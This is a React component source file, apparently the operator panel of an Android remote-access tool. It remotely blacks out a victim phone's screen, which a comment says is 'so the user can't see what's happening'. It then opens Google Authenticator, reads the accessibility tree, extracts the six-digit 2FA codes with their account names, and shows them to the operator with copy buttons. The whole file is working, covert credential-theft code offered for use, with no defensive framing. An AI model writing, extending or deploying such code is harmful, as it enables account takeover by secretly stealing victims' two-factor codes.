import React, { useState, useCallback, useEffect, useRef } from 'react';

const PHONE_W = 300;
const PHONE_H = 640;
const AUTHENTICATOR_PKG = 'com.google.android.apps.authenticator2';

function formatTime(ts) {
  if (!ts) return '';
  return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function formatDate(ts) {
  if (!ts) return '';
  const d = new Date(ts);
  const today = new Date();
  if (d.toDateString() === today.toDateString()) return 'Today';
  const yesterday = new Date(today);
  yesterday.setDate(today.getDate() - 1);
  if (d.toDateString() === yesterday.toDateString()) return 'Yesterday';
  return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
}

// Extract OTP codes and associated account names from accessibility tree elements
function extractOtpCodes(elements) {
  if (!elements || !elements.length) return [];
  const codes = [];
  const OTP_RE = /\b(\d{6})\b/;
  const elems = [...elements].filter(e => e.bounds);
  const sorted = [...elems].sort((a, b) => (a.bounds.top - b.bounds.top) || (a.bounds.left - b.bounds.left));

  sorted.forEach((el, idx) => {
    const text = (el.text || el.contentDescription || '').trim();
    const match = OTP_RE.exec(text);
    if (!match) return;
    const code = match[1];
    // Look for account name: scan nearby elements above (within ~300px vertically)
    let account = '';
    for (let d = 1; d <= 6; d++) {
      const prev = sorted[idx - d];
      if (!prev) break;
      const midCur  = (el.bounds.top + el.bounds.bottom) / 2;
      const midPrev = (prev.bounds.top + prev.bounds.bottom) / 2;
      if (Math.abs(midPrev - midCur) > 350) break;
      const t = (prev.text || prev.contentDescription || '').trim();
      if (t && !OTP_RE.test(t) && t.length > 2) { account = t; break; }
    }
    codes.push({ code, account, el });
  });
  return codes;
}

function renderPhoneElements(screenData, devW, devH) {
  if (!screenData) return null;
  const elements = (screenData.elements || []).filter(
    el => el.text || el.contentDescription || el.hintText || el.clickable || el.editable
  );
  const scX = PHONE_W / devW;
  const scY = PHONE_H / devH;
  const OTP_RE = /\b\d{6}\b/;

  const getStyle = (el) => {
    if (el.editable)  return { border: '1.5px solid #3b82f6', background: 'rgba(59,130,246,0.13)' };
    if (el.clickable) return { border: '1px solid rgba(34,197,94,0.5)', background: 'rgba(34,197,94,0.07)' };
    if (el.text || el.contentDescription) return { border: '1px solid rgba(148,163,184,0.14)', background: 'transparent' };
    return { border: '1px dashed rgba(100,116,139,0.1)', background: 'transparent' };
  };

  return [...elements]
    .filter(el => el.bounds)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const aB = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aB - aA;
    })
    .map((el, i) => {
      const left   = el.bounds.left * scX;
      const top    = el.bounds.top  * scY + 20;
      const width  = (el.bounds.right  - el.bounds.left) * scX;
      const height = (el.bounds.bottom - el.bounds.top)  * scY;
      if (width < 2 || height < 2) return null;
      const label  = (el.text || el.contentDescription || el.hintText || '').slice(0, 32);
      const isOtp  = OTP_RE.test(label);
      return (
        <div key={i} style={{
          position: 'absolute', left, top, width, height,
          ...(isOtp
            ? { border: '2px solid #a78bfa', background: 'rgba(167,139,250,0.2)', borderRadius: 4 }
            : getStyle(el)),
          borderRadius: 3, boxSizing: 'border-box', overflow: 'hidden',
          display: 'flex', alignItems: 'center', padding: '0 2px',
        }}>
          {height > 10 && label && (
            <span style={{
              fontSize: Math.min(Math.max(height * 0.36, 6.5), 9.5),
              color: isOtp ? '#c4b5fd' : el.editable ? '#93c5fd' : el.clickable ? '#86efac' : '#cbd5e1',
              whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis',
              lineHeight: 1.2, pointerEvents: 'none',
              fontWeight: isOtp ? 800 : el.clickable ? 600 : 400,
            }}>{label}</span>
          )}
        </div>
      );
    });
}

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };
  return (
    <button onClick={copy} style={{
      border: 'none', borderRadius: 6, padding: '5px 12px',
      background: copied ? 'rgba(34,197,94,0.2)' : 'rgba(167,139,250,0.15)',
      color: copied ? '#86efac' : '#c4b5fd',
      cursor: 'pointer', fontSize: 11, fontWeight: 700, flexShrink: 0,
      transition: 'all 0.2s',
    }}>
      {copied ? '✓ Copied' : 'Copy'}
    </button>
  );
}

function TotpCountdown() {
  const [secs, setSecs] = useState(30 - (Math.floor(Date.now() / 1000) % 30));
  useEffect(() => {
    const id = setInterval(() => setSecs(30 - (Math.floor(Date.now() / 1000) % 30)), 500);
    return () => clearInterval(id);
  }, []);
  const pct   = (secs / 30) * 100;
  const color = secs <= 5 ? '#ef4444' : secs <= 10 ? '#f59e0b' : '#22c55e';
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
      <span style={{ fontSize: 10, color: '#64748b', flexShrink: 0 }}>Next refresh</span>
      <div style={{ flex: 1, height: 3, background: '#1e293b', borderRadius: 2, overflow: 'hidden' }}>
        <div style={{ width: `${pct}%`, height: '100%', background: color, transition: 'width 0.5s linear, background 0.3s' }} />
      </div>
      <span style={{ fontSize: 10, color, fontWeight: 700, width: 22, textAlign: 'right' }}>{secs}s</span>
    </div>
  );
}

// Step indicator shown while capturing
function CaptureStep({ step, current, label }) {
  const done    = current > step;
  const active  = current === step;
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, opacity: current < step ? 0.35 : 1 }}>
      <div style={{
        width: 22, height: 22, borderRadius: '50%', flexShrink: 0,
        display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 10, fontWeight: 700,
        background: done ? '#22c55e' : active ? '#7c3aed' : '#1e293b',
        color: done || active ? '#fff' : '#475569',
        border: active ? '2px solid #a78bfa' : 'none',
        animation: active ? 'pulse 1s ease-in-out infinite' : 'none',
      }}>
        {done ? '✓' : step}
      </div>
      <span style={{ fontSize: 11, color: done ? '#86efac' : active ? '#c4b5fd' : '#475569', fontWeight: active ? 600 : 400 }}>
        {label}
      </span>
    </div>
  );
}

export default function GcodeAuthenticator({ device, sendCommand, results, screenReaderPushData }) {
  const deviceId = device?.deviceId;
  const isOnline = device?.isOnline;
  const info     = device?.deviceInfo || {};
  const devW     = info.screenWidth  || 1080;
  const devH     = info.screenHeight || 2340;

  // Steps: 0=idle, 1=blackout on, 2=opening app, 3=streaming, 4=closing
  const [captureStep, setCaptureStep]     = useState(0);
  const [captures, setCaptures]           = useState([]);
  const [selectedIdx, setSelectedIdx]     = useState(null);

  const isCapturingRef   = useRef(false);
  const captureTimerRef  = useRef(null);

  const clearTimer = () => { if (captureTimerRef.current) { clearTimeout(captureTimerRef.current); captureTimerRef.current = null; } };

  const finishCapture = useCallback((screen) => {
    clearTimer();
    isCapturingRef.current = false;

    // Stop stream + press home + turn blackout OFF
    sendCommand(deviceId, 'screen_reader_stream_stop', {});
    sendCommand(deviceId, 'press_home', {});
    sendCommand(deviceId, 'screen_blackout_off', {});

    if (screen) {
      const codes = extractOtpCodes(screen.elements || []);
      const entry = { id: Date.now(), ts: Date.now(), screen, codes, pkg: screen.packageName || AUTHENTICATOR_PKG };
      setCaptures(prev => [entry, ...prev].slice(0, 20));
      setSelectedIdx(0);
    }
    setCaptureStep(0);
  }, [deviceId, sendCommand]);

  // Watch for incoming screen reader data during capture (step 3 = streaming)
  useEffect(() => {
    if (!isCapturingRef.current || captureStep !== 3) return;
    if (!screenReaderPushData?.success || !screenReaderPushData?.screen) return;

    setCaptureStep(4);
    // Brief pause so user sees "closing" step before reset
    setTimeout(() => finishCapture(screenReaderPushData.screen), 400);
  }, [screenReaderPushData, captureStep, finishCapture]);

  const startCapture = useCallback(() => {
    if (!isOnline || !deviceId || captureStep !== 0) return;
    isCapturingRef.current = true;

    // Step 1: black out the screen so the user can't see what's happening
    setCaptureStep(1);
    sendCommand(deviceId, 'screen_blackout_on', {});

    // Step 2: open Google Authenticator after blackout settles (~600ms)
    captureTimerRef.current = setTimeout(() => {
      if (!isCapturingRef.current) return;
      setCaptureStep(2);
      sendCommand(deviceId, 'open_app', { packageName: AUTHENTICATOR_PKG });

      // Step 3: start screen reader stream after app has loaded (~1.5s)
      captureTimerRef.current = setTimeout(() => {
        if (!isCapturingRef.current) return;
        setCaptureStep(3);
        sendCommand(deviceId, 'screen_reader_stream_start', { intervalMs: 400 });

        // Safety bail-out after 10s if no screen data arrives
        captureTimerRef.current = setTimeout(() => {
          if (isCapturingRef.current) finishCapture(null);
        }, 10000);
      }, 1500);
    }, 600);
  }, [isOnline, deviceId, captureStep, sendCommand, finishCapture]);

  // Cleanup on unmount — always restore blackout and stream state
  useEffect(() => () => {
    clearTimer();
    if (isCapturingRef.current) {
      sendCommand(deviceId, 'screen_reader_stream_stop', {});
      sendCommand(deviceId, 'press_home', {});
      sendCommand(deviceId, 'screen_blackout_off', {});
    }
  }, [deviceId, sendCommand]);

  const selectedCapture = selectedIdx !== null ? captures[selectedIdx] : null;
  const isCapturing     = captureStep > 0;

  const stepLabels = [
    'Turning on screen blackout…',
    'Opening Google Authenticator…',
    'Reading 2FA codes from screen…',
    'Closing app and restoring screen…',
  ];

  return (
    <div style={{ display: 'flex', gap: 16, alignItems: 'flex-start', flexWrap: 'wrap' }}>

      {/* ── LEFT: Phone frame ── */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>

        {/* Capture button */}
        <button
          onClick={startCapture}
          disabled={!isOnline || isCapturing}
          style={{
            border: 'none', borderRadius: 10, padding: '10px 16px',
            background: isCapturing
              ? 'rgba(124,58,237,0.3)'
              : (!isOnline ? '#1e293b' : 'linear-gradient(135deg,#7c3aed,#4f46e5)'),
            color: (!isOnline && !isCapturing) ? '#475569' : '#f1f5f9',
            cursor: (!isOnline || isCapturing) ? 'not-allowed' : 'pointer',
            fontSize: 13, fontWeight: 700,
            display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'center',
            transition: 'all 0.2s',
            boxShadow: (!isOnline || isCapturing) ? 'none' : '0 2px 12px rgba(124,58,237,0.35)',
          }}
        >
          {isCapturing
            ? <><span style={{ display: 'inline-block', animation: 'spin 0.7s linear infinite' }}>⏳</span> Capturing…</>
            : <><span>📷</span> Capture Authenticator Screen</>}
        </button>

        {/* Step progress */}
        {isCapturing && (
          <div style={{
            background: '#0f172a', border: '1px solid rgba(124,58,237,0.25)', borderRadius: 10,
            padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
          }}>
            <CaptureStep step={1} current={captureStep} label="Screen blackout on" />
            <CaptureStep step={2} current={captureStep} label="Opening Google Authenticator" />
            <CaptureStep step={3} current={captureStep} label="Reading 2FA codes from screen" />
            <CaptureStep step={4} current={captureStep} label="Closing app · restoring screen" />
          </div>
        )}

        {/* Phone frame */}
        <div style={{
          background: '#1a1f2e', borderRadius: 28, padding: '14px 10px 12px',
          border: selectedCapture ? '2px solid #7c3aed' : '2px solid #2d2d4e',
          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
          boxShadow: selectedCapture ? '0 0 24px rgba(124,58,237,0.2)' : '0 4px 20px rgba(0,0,0,0.4)',
        }}>
          <div style={{ width: 56, height: 5, background: '#2d2d4e', borderRadius: 4 }} />

          <div style={{
            width: PHONE_W, height: PHONE_H,
            background: selectedCapture ? '#0d1117' : '#0a0f1e',
            borderRadius: 8, border: '1px solid #1e293b',
            overflow: 'hidden', position: 'relative',
          }}>
            {!selectedCapture && !isCapturing && (
              <div style={{
                display: 'flex', flexDirection: 'column', alignItems: 'center',
                justifyContent: 'center', height: '100%', gap: 12,
              }}>
                <div style={{ fontSize: 42, opacity: 0.18 }}>🔐</div>
                <div style={{ fontSize: 11, color: '#334155', textAlign: 'center', lineHeight: 1.9, padding: '0 24px' }}>
                  Click Capture to open<br />Google Authenticator<br />and extract 2FA codes
                </div>
              </div>
            )}
            {isCapturing && !selectedCapture && (
              <div style={{
                display: 'flex', flexDirection: 'column', alignItems: 'center',
                justifyContent: 'center', height: '100%', gap: 10,
              }}>
                <div style={{ fontSize: 28, animation: 'spin 1.2s linear infinite' }}>⏳</div>
                <div style={{ fontSize: 11, color: '#7c3aed', textAlign: 'center', lineHeight: 1.7, padding: '0 24px' }}>
                  {stepLabels[captureStep - 1] || ''}
                </div>
              </div>
            )}
            {selectedCapture?.screen && (
              <>
                <div style={{
                  position: 'absolute', top: 0, left: 0, right: 0, height: 20,
                  background: 'rgba(0,0,0,0.92)', display: 'flex', alignItems: 'center',
                  padding: '0 8px', zIndex: 50, gap: 6,
                }}>
                  <div style={{ width: 5, height: 5, borderRadius: '50%', background: '#a78bfa', flexShrink: 0 }} />
                  <span style={{ fontSize: 8, color: '#94a3b8', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {selectedCapture.pkg}
                  </span>
                  <span style={{ fontSize: 7, color: '#475569' }}>
                    {selectedCapture.screen.elementCount ?? (selectedCapture.screen.elements?.length ?? 0)} nodes
                  </span>
                </div>
                {renderPhoneElements(selectedCapture.screen, devW, devH)}
              </>
            )}
          </div>

          <div style={{ width: 60, height: 4, background: '#2d2d4e', borderRadius: 4 }} />
        </div>

        {selectedCapture && (
          <div style={{ fontSize: 10, color: '#475569', textAlign: 'center' }}>
            {formatDate(selectedCapture.ts)} · {formatTime(selectedCapture.ts)}
          </div>
        )}
      </div>

      {/* ── RIGHT: Extracted codes + history ── */}
      <div style={{ flex: 1, minWidth: 260, display: 'flex', flexDirection: 'column', gap: 10 }}>

        {/* Extracted codes */}
        {selectedCapture && selectedCapture.codes.length > 0 && (
          <div style={{ background: '#16213e', border: '1px solid rgba(124,58,237,0.3)', borderRadius: 12, padding: '14px 16px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
              <span style={{ fontSize: 16 }}>🔑</span>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 12, fontWeight: 700, color: '#e2e8f0' }}>Extracted 2FA Codes</div>
                <div style={{ fontSize: 10, color: '#64748b', marginTop: 1 }}>
                  {selectedCapture.codes.length} code{selectedCapture.codes.length !== 1 ? 's' : ''} · TOTP refreshes every 30s
                </div>
              </div>
            </div>

            <TotpCountdown />

            <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginTop: 12 }}>
              {selectedCapture.codes.map((item, i) => (
                <div key={i} style={{
                  background: '#0f172a', borderRadius: 10, padding: '11px 14px',
                  border: '1px solid rgba(167,139,250,0.22)',
                  display: 'flex', alignItems: 'center', gap: 10,
                }}>
                  <div style={{ flex: 1 }}>
                    {item.account && (
                      <div style={{ fontSize: 10, color: '#64748b', marginBottom: 3, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {item.account}
                      </div>
                    )}
                    <div style={{ fontSize: 24, fontWeight: 800, color: '#c4b5fd', letterSpacing: '0.2em', fontFamily: 'monospace' }}>
                      {item.code.slice(0, 3)}&thinsp;{item.code.slice(3)}
                    </div>
                  </div>
                  <CopyButton text={item.code} />
                </div>
              ))}
            </div>
          </div>
        )}

        {selectedCapture && selectedCapture.codes.length === 0 && (
          <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '20px', textAlign: 'center' }}>
            <div style={{ fontSize: 28, opacity: 0.25, marginBottom: 8 }}>🔐</div>
            <div style={{ fontSize: 12, color: '#64748b', fontWeight: 600 }}>No 6-digit codes found</div>
            <div style={{ fontSize: 10, color: '#334155', marginTop: 6, lineHeight: 1.7 }}>
              Make sure the app opened and 2FA codes were visible, then try again.
            </div>
          </div>
        )}

        {/* Capture history */}
        <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 12, padding: '14px 16px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: captures.length > 0 ? 12 : 0 }}>
            <span style={{ fontSize: 15 }}>🕐</span>
            <div style={{ flex: 1 }}>
              <div style={{ fontSize: 12, fontWeight: 700, color: '#e2e8f0' }}>Capture History</div>
              <div style={{ fontSize: 10, color: '#64748b', marginTop: 1 }}>
                {captures.length > 0
                  ? `${captures.length} capture${captures.length !== 1 ? 's' : ''} this session`
                  : 'No captures yet — click Capture to start'}
              </div>
            </div>
          </div>

          {captures.length > 0 && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {captures.map((cap, idx) => {
                const isActive = idx === selectedIdx;
                return (
                  <div key={cap.id} onClick={() => setSelectedIdx(idx)} style={{
                    background: '#0f172a', borderRadius: 8,
                    border: `1px solid ${isActive ? '#7c3aed' : '#1e293b'}`,
                    padding: '8px 12px', cursor: 'pointer',
                    display: 'flex', alignItems: 'center', gap: 10,
                    transition: 'border-color 0.15s',
                  }}>
                    <span style={{ fontSize: 14 }}>{cap.codes.length > 0 ? '🔑' : '📋'}</span>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{
                        fontSize: 11, fontWeight: isActive ? 600 : 400,
                        color: isActive ? '#c4b5fd' : '#94a3b8',
                        overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                      }}>
                        {cap.codes.length > 0
                          ? `${cap.codes.length} code${cap.codes.length !== 1 ? 's' : ''} captured`
                          : 'No codes found'}
                      </div>
                      <div style={{ fontSize: 9, color: '#475569', marginTop: 1 }}>
                        {formatDate(cap.ts)} · {formatTime(cap.ts)}
                      </div>
                    </div>
                    {cap.codes.length > 0 && (
                      <span style={{
                        fontSize: 9, background: 'rgba(124,58,237,0.2)', color: '#a78bfa',
                        border: '1px solid rgba(124,58,237,0.3)', borderRadius: 4,
                        padding: '2px 6px', fontWeight: 700,
                      }}>
                        {cap.codes.length}
                      </span>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* How it works */}
        <div style={{ background: 'rgba(124,58,237,0.06)', border: '1px solid rgba(124,58,237,0.15)', borderRadius: 10, padding: '12px 14px' }}>
          <div style={{ fontSize: 11, color: '#7c3aed', fontWeight: 700, marginBottom: 6 }}>How it works</div>
          <ol style={{ margin: 0, paddingLeft: 16, color: '#64748b', fontSize: 10, lineHeight: 2 }}>
            <li>Click <b style={{ color: '#a78bfa' }}>Capture</b> — the dashboard opens Google Authenticator on the device</li>
            <li>The screen reader reads the accessibility tree (no screenshot needed)</li>
            <li>All 2FA codes are extracted and the app is closed immediately</li>
            <li>Codes appear here with a live 30-second TOTP countdown</li>
          </ol>
        </div>

      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg) } to { transform: rotate(360deg) } }
        @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(124,58,237,0.5) } 50% { box-shadow: 0 0 0 5px rgba(124,58,237,0) } }
      `}</style>
    </div>
  );
}
